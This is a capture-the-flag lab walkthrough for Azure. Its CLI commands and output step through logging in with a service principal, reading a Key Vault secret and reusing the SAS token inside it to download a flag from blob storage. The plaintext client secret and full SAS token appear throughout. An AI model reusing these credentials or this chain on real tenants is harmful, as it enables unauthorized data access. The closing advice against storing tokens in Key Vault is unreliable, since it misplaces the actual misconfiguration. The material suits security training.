
# COMPLETE LAB COMMANDS WITH LIVE EXAMPLES - HIGHLIGHTED!
## Vaulted Keys and Hidden Blobs
## COMMAND 1: LOGIN TO AZURE
```cmd
az login --service-principal -u 76e1a895-1f05-4165-83ab-98eed07bed86 -p 6LU8Q~OjXfR3z8ZTOHqd0MpE8r1bGs0qStavaacZ --tenant f2a33211-e46a-4c92-b84d-aff06c2cd13f
```

**🔍 CHECK THIS IN YOUR OUTPUT:**
```
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "f2a33211-e46a-4c92-b84d-aff06c2cd13f",
    "id": "662a4fee-a3ba-49b3-9caf-8c20ed04503f",
    "isDefault": true,
    ➡️ "name": "Prod",           <─── SUBSCRIPTION NAME
    "state": "Enabled",
    "tenantId": "f2a33211-e46a-4c92-b84d-aff06c2cd13f",
    "user": {
      ➡️ "name": "76e1a895-1f05-4165-83ab-98eed07bed86",  <─── YOUR SERVICE PRINCIPAL
      "type": "servicePrincipal"
    }
  }
]
```

---

## COMMAND 2: CHECK YOUR PERMISSIONS
```cmd
az role assignment list --assignee 76e1a895-1f05-4165-83ab-98eed07bed86 --output json --all
```

**🔍 CHECK THESE HIGHLIGHTED WORDS IN YOUR OUTPUT:**
```json
[
  {
    "id": "/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG/providers/Microsoft.Authorization/roleAssignments/f09b7c03-8d32-b640-0699-d9014b26fef2",
    ➡️ "principalName": "76e1a895-1f05-4165-83ab-98eed07bed86",  <─── THAT'S YOU!
    "principalType": "ServicePrincipal",
    ➡️ "resourceGroup": "DataBack-RG",  <─── RESOURCE GROUP NAME
    ➡️ "roleDefinitionName": "Reader",  <─── FIRST PERMISSION
    "scope": "/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG"
  },
  {
    "id": "/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG/providers/Microsoft.KeyVault/vaults/secopprobackkv/providers/Microsoft.Authorization/roleAssignments/ee71a019-efcd-d31b-2be0-33e56f1b5621",
    ➡️ "roleDefinitionName": "Key Vault Secrets User",  <─── IMPORTANT PERMISSION!
    ➡️ "scope": "/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG/providers/Microsoft.KeyVault/vaults/secopprobackkv",  <─── KEY VAULT LOCATION
  }
]
```

**✅ THIS SHOWS:** You have permission to read secrets from Key Vault named **secopprobackkv**!

---

## COMMAND 3: FIND THE KEY VAULT
```cmd
az keyvault list --resource-group DataBack-RG
```

**🔍 CHECK THESE HIGHLIGHTED WORDS:**
```json
[
  {
    "id": "/subscriptions/662a4fee-a3ba-49b3-9caf-8c20ed04503f/resourceGroups/DataBack-RG/providers/Microsoft.KeyVault/vaults/secopprobackkv",
    "location": "eastus",
    ➡️ "name": "secopprobackkv",  <─── KEY VAULT NAME - REMEMBER THIS!
    "properties": {
      "accessPolicies": [
        {
          ➡️ "objectId": "2903a6a7-87c7-45dc-96b8-dc5bf8546d87",  <─── YOUR SERVICE PRINCIPAL ID
          "permissions": {
            "secrets": [
              ➡️ "Get",  <─── YOU CAN GET SECRETS!
              ➡️ "List"   <─── YOU CAN LIST SECRETS!
            ]
          }
        }
      ],
      ➡️ "vaultUri": "https://secopprobackkv.vault.azure.net/"  <─── KEY VAULT URL
    }
  }
]
```

---

## COMMAND 4: LIST SECRETS IN KEY VAULT
```cmd
az keyvault secret list --vault-name secopprobackkv
```

**🔍 CHECK THESE HIGHLIGHTED WORDS:**
```json
[
  {
    "attributes": {
      "created": "2025-11-28T06:26:08+00:00",
      "enabled": true
    },
    ➡️ "id": "https://secopprobackkv.vault.azure.net/secrets/secopprobacksaSAASToken",  <─── SECRET URL
    ➡️ "name": "secopprobacksaSAASToken"  <─── SECRET NAME - THIS IS THE SAS TOKEN!
  }
]
```

**✅ THIS SHOWS:** There's a secret called **secopprobacksaSAASToken** - probably a SAS token for a storage account!

---

## COMMAND 5: GET THE SECRET VALUE
```cmd
az keyvault secret show --name secopprobacksaSAASToken --vault-name secopprobackkv
```

**🔍 CHECK THESE HIGHLIGHTED WORDS - THIS IS CRITICAL!**
```json
{
  "attributes": {
    "created": "2025-11-28T06:26:08+00:00",
    "enabled": true
  },
  "id": "https://secopprobackkv.vault.azure.net/secrets/secopprobacksaSAASToken/2196babb14c84363999df9329d58afea",
  "name": "secopprobacksaSAASToken",
  ➡️ "value": "sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D"  <─── THE ACTUAL SAS TOKEN!
}
```

**✅ THIS IS THE GOLD MINE!** This SAS token lets you access the storage account **secopprobacksa** (from the secret name)!

---

## COMMAND 6: CHECK STORAGE ACCOUNT CONTAINERS USING SAS TOKEN
```cmd
az storage container list --account-name secopprobacksa --sas-token "?sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D" --output table
```

**🔍 CHECK THIS IN YOUR OUTPUT:**
```
Name            Lease Status    Last Modified
--------------  --------------  -------------------------
➡️ secopprobacksc                  2024-10-15T10:02:21+00:00  <─── CONTAINER NAME!
```

**✅ THIS SHOWS:** The storage account has a container called **secopprobacksc**!

---

## COMMAND 7: DOWNLOAD THE FLAG FILE
```cmd
az storage blob download --account-name secopprobacksa --container-name secopprobacksc --name Flag.txt --file Flag.txt --sas-token "?sv=2024-11-04&ss=bfqt&srt=sco&sp=rltfx&se=2028-11-28T14:15:47Z&st=2025-11-28T06:00:47Z&spr=https&sig=0t6AaxsrIAHeqdwok%2FFq4xtviXOHLrwQfvdMWTG2zKE%3D"
```

**🔍 CHECK THIS IN YOUR OUTPUT:**
```
Finished[#############################################################]  100.0000%
{
  "container": "secopprobacksc",
  ➡️ "name": "Flag.txt",  <─── FILE DOWNLOADED!
  "properties": {
    "contentLength": 26,  <─── FILE SIZE
    "contentSettings": {
      "contentType": "application/txt"
    }
  }
}
```

---

## COMMAND 8: VIEW THE FLAG (FINAL STEP!)
```cmd
type Flag.txt
```

**🔍 CHECK THIS - THIS IS YOUR ANSWER!**
```
C:\Users\Bharathi>type Flag.txt
➡️ CWL{Azure_KeyVau!t_H@cker}  <─── 🏁 THE FLAG! 🏁
C:\Users\Bharathi>Lab Started
```

---

# 📋 QUICK REFERENCE - WHAT TO LOOK FOR:

| Command | Look For This Word/Phrase | Why It's Important |
|--------|--------------------------|-------------------|
| `az login` | **"name": "Prod"** | Confirms you're logged in |
| `az role assignment` | **"Key Vault Secrets User"** | Shows you can read secrets |
| `az keyvault list` | **"name": "secopprobackkv"** | Key Vault name |
| `az keyvault secret list` | **"name": "secopprobacksaSAASToken"** | Secret containing SAS token |
| `az keyvault secret show` | **"value": "sv=2024..."** | The actual SAS token! |
| `az storage container list` | **"secopprobacksc"** | Container with the flag |
| `az storage blob download` | **"name": "Flag.txt"** | File downloaded successfully |
| `type Flag.txt` | **"CWL{Azure_KeyVau!t_H@cker}"** | THE FLAG! |

---

# 🎯 WHY THIS LAB WORKS:

1. **Misconfiguration:** Someone gave your Service Principal "Key Vault Secrets User" permission
2. **Bad Practice:** Someone stored a Storage Account SAS token in Key Vault
3. **Lateral Movement:** You used the SAS token to access Storage Account even without direct permission
4. **Flag Found:** The flag was waiting in a blob container

**THE LESSON:** Never store access tokens in Key Vault if you don't want them found, and be careful who you give "Secrets User" permission to!
